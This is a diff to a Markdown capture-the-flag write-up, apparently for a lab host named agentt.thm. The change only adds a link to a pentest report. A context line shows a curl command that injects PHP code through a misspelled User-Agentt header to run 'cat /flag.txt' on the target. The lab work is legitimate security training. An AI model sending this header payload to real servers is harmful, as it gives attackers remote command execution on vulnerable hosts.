@@ -57,4 +57,9 @@ curl -H "User-Agentt: zerodiumsystem('cat /flag.txt');" http://agentt.thm | head
 
 ![flag](screenshots/flag.png)
 
+---
+## Additional Documentation
 
+For a professional-style penetration testing report, see:
+
+[Pentest Report](Report%20-%20Pentest.md)
